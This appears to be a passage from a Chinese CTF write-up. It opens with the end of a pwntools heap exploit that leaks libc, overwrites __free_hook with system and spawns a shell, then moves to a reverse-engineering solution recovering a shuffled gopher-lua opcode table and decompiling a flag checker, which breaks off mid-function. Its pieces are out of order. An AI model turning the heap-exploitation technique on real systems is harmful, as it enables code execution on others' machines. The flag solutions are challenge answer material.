manage_exit()
show('cat',0)
s.recvuntil("name:")
heap = u64(s.recv(8))-0x12e50
success(hex(heap))
create('cat',1,'c'*0x500,100)
create('cat',2,'c'*0x20,100)
create('cat',1,'cccc',100)
manage()
changeAge('dog',0x400)
changeAge('dog',0x50)
manage_exit()
show('cat',0)
libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-0x1eb000-0x10b0
success(hex(libc.address))
create('cat',3,'/bin/sh\x00'+'f'*0xf8,100)
create('cat',4,'g'*0x100,100)
manage()
changeAge('dog',0x400)
changeAge('dog',0x400)
changeAge('dog',0xe8)
changeName('cat',p64(libc.sym['__free_hook']))
select('cat',4)
changeName('cat',p64(libc.sym['system']))
manage_exit()
create('cat',3,'/bin/sh\x00',100)
# gdb.attach(s)
Reverse
languages binding
通过readfile和硬件断点来到这⾥，发现对⽂件先做整体异或0x55
通过字符串发现使⽤了⼀个叫luago的库
找了下，和这个库函数名对的上：https://github.com/yuin/gopher-lua
看上个target：
拿23,14,6,0x1ff为⽬标魔数，通过⼆进制搜索，发现疑似函数 0x4D5DC0
并顺着xref找到了opcode的定义0x525540
s.interactive()
.text:0000000000501FDD                 movzx   r8d, byte ptr [rax+rdx]
.text:0000000000501FE2                 xor     r8d, 55h
.text:0000000000501FE6                 mov     [rax+rdx], r8b
.text:0000000000501FEA                 inc     rdx
.text:0000000000501FED                 cmp     rbx, rdx
.text:0000000000501FF0                 jg      short loc_501FDD
func (instr Instruction) ABC() (a, b, c int) {
  a = int(instr >> 6 & 0xFF)
  c = int(instr >> 14 & 0x1FF)
  b = int(instr >> 23 & 0x1FF)
  return
}
.data:0000000000525540 opcode          Opcode 
.data:0000000000525540                 Opcode  ; "NONNAME"
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
对应的源码可以参考上述仓库中 vm/opcodes.go
还原出来的op顺序：
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
.data:0000000000525540                 Opcode 
00000000 Opcode          struc ; (sizeof=0x20, mappedto_27)
00000000                                         ; XREF: .data:opcode/r
00000000 testFlag        db ?
00000001 setAFlag        db ?
00000002 argBMode        db ?
00000003 argCMode        db ?
00000004 opMode          db ?
00000005 __dummy         db 3 dup(?)
00000008 name            dq ?                    ; offset
00000010 name_len        dq ?
00000018 fptr            dq ?                    ; offset
00000020 Opcode          ends
00000020
⽤开源⼯具luadec尝试反编译
OP_UNM
OP_SETLIST
OP_TESTSET
OP_CLOSURE
OP_LOADKX
OP_TFORLOOP
OP_NEWTABLE
OP_SHR
OP_SETTABLE
OP_ADD
OP_TAILCALL
OP_SETUPVAL
OP_EXTRAARG
OP_GETTABUP
OP_LEN
OP_SUB
OP_LOADBOOL
OP_TFORCALL
OP_LOADNIL
OP_FORPREP
OP_SHL
OP_TEST
OP_BXOR
OP_LT
OP_CALL
OP_NOT
OP_BOR
OP_MUL
OP_SETTABUP
OP_EQ
OP_MOVE
OP_JMP
OP_IDIV
OP_GETTABLE
OP_CONCAT
OP_GETUPVAL
OP_POW
OP_MOD
OP_DIV
OP_BNOT
OP_SELF
OP_LE
OP_RETURN
OP_FORLOOP
OP_VARARG
OP_LOADK
OP_BAND
先⽤luaopswap，创建如下swap.txt
MOVE UNM
LOADK SETLIST
LOADKX TESTSET
LOADBOOL CLOSURE
LOADNIL LOADKX
GETUPVAL TFORLOOP
GETTABUP NEWTABLE
GETTABLE SHR
SETTABUP SETTABLE
SETUPVAL ADD
SETTABLE TAILCALL
NEWTABLE SETUPVAL
SELF EXTRAARG
ADD GETTABUP
SUB LEN
MUL SUB
MOD LOADBOOL
POW TFORCALL
DIV LOADNIL
IDIV FORPREP
BAND SHL
BOR TEST
BXOR BXOR
SHL LT
SHR CALL
UNM NOT
BNOT BOR
NOT MUL
LEN SETTABUP
CONCAT EQ
JMP MOVE
EQ JMP
LT IDIV
LE GETTABLE
TEST CONCAT
TESTSET GETUPVAL
CALL POW
TAILCALL MOD
RETURN DIV
FORLOOP BNOT
FORPREP SELF
TFORCALL LE
TFORLOOP RETURN
SETLIST FORLOOP
CLOSURE VARARG
VARARG LOADK
EXTRAARG BAND
之后直接⽤luadec反汇编
-- Decompiled using luadec 2.2 rev: 895d923 for Lua 5.3 from 
https://github.com/viruscamp/luadec
-- Command line: luaopswap.luac
-- params : ...
-- function num : 0 , upvalues : _ENV
print("input flag:")
flag = (io.read)()
if #flag ~= 29 then -- ⻓度29
  print("flag is wrong")
  return
end
lst = {100, 120, 133}
dict = {[9] = 101, [10] = 122}
ad = function(a, b)
  -- function num : 0_0
  return a + b
end
mul = function(a, b)
  -- function num : 0_1
  return a * b
end
check2 = function(f) -- _ymz7fm0dfx
  -- function num : 0_2 , upvalues : _ENV
  if (string.byte)(f, 18) + 11 ~= 106 then -- _
    return false
  elseif (string.byte)(f, 19) ~= lst[1] + 21 then -- y
    return false